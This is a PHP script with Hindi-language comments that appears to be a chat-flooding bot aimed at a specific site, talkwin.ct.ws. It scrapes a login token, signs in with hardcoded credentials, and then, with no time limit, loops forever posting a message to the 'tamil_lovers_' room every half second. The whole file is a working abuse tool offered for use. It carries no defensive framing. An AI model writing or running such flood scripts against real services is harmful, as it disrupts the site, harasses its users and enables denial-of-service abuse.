<?php
// Is code ko index.php mein daalein
set_time_limit(0);
$cookie = "/tmp/cookie.txt";
$url = "https://talkwin.ct.ws/login.php"; // Login page

// 1. Token nikaalne ke liye pehle page load karein
$ch = curl_init($url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);
$page = curl_exec($ch);

// Token dhoondna (Agar site use karti hai)
preg_match('/name="token" value="(.*?)"/', $page, $match);
$token = $match[1] ?? '';

// 2. Login karein
$loginData = [
    'username' => 'Ankit',
    'password' => 'Ankit123',
    'token'    => $token,
    'login'    => 'Login'
];

curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($loginData));
curl_exec($ch);
curl_close($ch);

// 3. Flood Loop
while(true) {
    $ch = curl_init("https://talkwin.ct.ws/room.php?room=tamil_lovers_");
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, "msg=Testing&send=Send");
    curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_exec($ch);
    curl_close($ch);
    usleep(500000); 
}
